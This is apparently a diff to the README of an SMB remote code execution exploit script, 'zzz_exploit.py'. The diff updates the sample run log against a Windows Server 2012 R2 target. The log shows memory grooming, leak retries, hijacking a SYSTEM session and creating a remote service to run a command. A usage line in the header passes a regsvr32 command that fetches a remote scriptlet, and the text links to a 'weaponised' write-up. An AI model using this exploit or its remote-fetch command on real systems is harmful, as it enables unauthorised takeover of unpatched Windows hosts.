@@ -51,26 +51,45 @@ Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.1
 Sample output:
 ```
 > # python zzz_exploit.py -t 10.10.11.53                                                                                                                                                     
-[08:38:41]  [INFO]: 	TARGET: 10.10.11.53
-[08:38:41]  [ACTION]: 	CONNECTING TO TARGET...
-[08:38:41]  [ACTION]: 	GETTING TARGET OS...
-[08:38:41]  [INFO]: 	TARGET OS: Windows Server 2012 R2 Datacenter 9600
-[08:38:41]  [ACTION]: 	GETTING PIPE...
-[08:38:41]  [INFO]: 	USING PIPE: spoolss
-[08:38:41]  [INFO]: 	TARGET ARCHITECTURE: 64 bit
-[08:38:41]  [INFO]: 	FRAG SIZE: 0x20
-[08:38:41]  [INFO]: 	GROOM_POOL_SIZE: 0x5030
-[08:38:41]  [INFO]: 	BRIDE_TRANS_SIZE: 0xf90
-[08:38:41]  [INFO]: 	CONNECTION: 0xffffe001c6257910
-[08:38:41]  [INFO]: 	SESSION: 0xffffc000f987c810
-[08:38:41]  [INFO]: 	FLINK: 0xffffc000faf26098
-[08:38:41]  [INFO]: 	InParam: 0xffffc000faf2016c
-[08:38:41]  [INFO]: 	MID: 0x2203
-[08:38:41]  [SUCCESS]: 	SUCCESS CONTROLLING GROOM TRANSACTION
-[08:38:41]  [ACTION]: 	MODIFYING TRANS1 STRUCT FOR READ/WRITE
-[08:38:42]  [ACTION]: 	CREATING SYSTEM SESSION TO SMB...
-[08:38:42]  [ACTION]: 	OVERWRITING SESSION SECURITY CONTEXT
-[08:38:42]  [SUCCESS]: 	FINISHED!
+[08:50:24]  [INFO]:     TARGET: 10.10.11.53
+[08:50:24]  [ACTION]:   CONNECTING TO TARGET...
+[08:50:24]  [ACTION]:   GETTING TARGET OS...
+[08:50:24]  [INFO]:     TARGET OS: Windows Server 2012 R2 Datacenter 9600
+[08:50:24]  [ACTION]:   GETTING PIPE...
+[08:50:25]  [INFO]:     USING PIPE: spoolss
+[08:50:25]  [INFO]:     TARGET ARCHITECTURE: 64 bit
+[08:50:25]  [INFO]:     FRAG SIZE: 0x20
+[08:50:25]  [INFO]:     GROOM_POOL_SIZE: 0x5030
+[08:50:25]  [INFO]:     BRIDE_TRANS_SIZE: 0xf90
+[08:50:25]  [ERROR]:    No transaction struct in leak data
+[08:50:25]  [ERROR]:    LEAK FAILED! RETRYING...
+[08:50:26]  [ERROR]:    No transaction struct in leak data
+[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
+[08:50:26]  [ERROR]:    No transaction struct in leak data
+[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
+[08:50:26]  [INFO]:     CONNECTION: 0xffffe001c6257910
+[08:50:26]  [INFO]:     SESSION: 0xffffc000fab68150
+[08:50:26]  [INFO]:     FLINK: 0xffffc000fafcd098
+[08:50:26]  [INFO]:     InParam: 0xffffc000faf9116c
+[08:50:26]  [INFO]:     MID: 0x3903
+[08:50:26]  [ERROR]:    unexpected alignment, diff: 0x3b098
+[08:50:26]  [ERROR]:    LEAK FAILED! RETRYING...
+[08:50:27]  [INFO]:     CONNECTION: 0xffffe001c6257910
+[08:50:27]  [INFO]:     SESSION: 0xffffc000fab68150
+[08:50:27]  [INFO]:     FLINK: 0xffffc000fafd9098
+[08:50:27]  [INFO]:     InParam: 0xffffc000fafd316c
+[08:50:27]  [INFO]:     MID: 0x3a03
+[08:50:27]  [SUCCESS]:  SUCCESS CONTROLLING GROOM TRANSACTION
+[08:50:27]  [ACTION]:   MODIFYING TRANS1 STRUCT FOR READ/WRITE
+[08:50:27]  [ACTION]:   CREATING SYSTEM SESSION TO SMB...
+[08:50:28]  [ACTION]:   OVERWRITING SESSION SECURITY CONTEXT
+[08:50:28]  [INFO]:     Writing command to service:
+[08:50:28]  [ACTION]:   OPENING SVCManager ON 10.10.11.53...
+[08:50:28]  [ACTION]:   CREATING SERVICE PKfJ...
+[08:50:28]  [ACTION]:   STARTING SERVICE PKfJ...
+[08:50:29]  [ERROR]:    SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.                    
+[08:50:29]  [ACTION]:   REMOVING SERVICE PKfJ...
+[08:50:29]  [SUCCESS]:  FINISHED!
 ```
 I wrote an article using Korey's payload and the new changes to the script, please see it [here](https://mez0.cc/posts/weaponised-worawit.html)
 
